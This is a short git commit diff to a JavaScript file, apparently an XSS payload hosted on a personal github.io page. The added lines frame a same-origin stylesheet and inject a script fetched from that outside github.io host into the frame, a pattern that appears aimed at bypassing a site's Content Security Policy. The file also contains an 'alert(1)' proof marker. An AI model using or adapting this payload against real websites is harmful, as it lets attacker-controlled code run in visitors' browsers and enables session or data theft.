a3db6c13c3d284852448cbeb0710e0f3a6d80862
vasilevigor3 <32871596+vasilevigor3@users.noreply.github.com>
2023-08-11 00:37:03 +0400

    Update myjs.js

--- myjs.js
+++ myjs.js
@@ -1,5 +1,12 @@
 document.createElement('div');
 
+frame=document.createElement("iframe");
+frame.src="/css/bootstrap.min.css";
+document.body.appendChild(frame);
+script=document.createElement('script');
+script.src='//vasilevigor3.github.io/myjs.js';
+window.frames[0].document.head.appendChild(script);
+
 javascript:alert(1);
 var iframeDocument = frame.contentWindow.document;
 
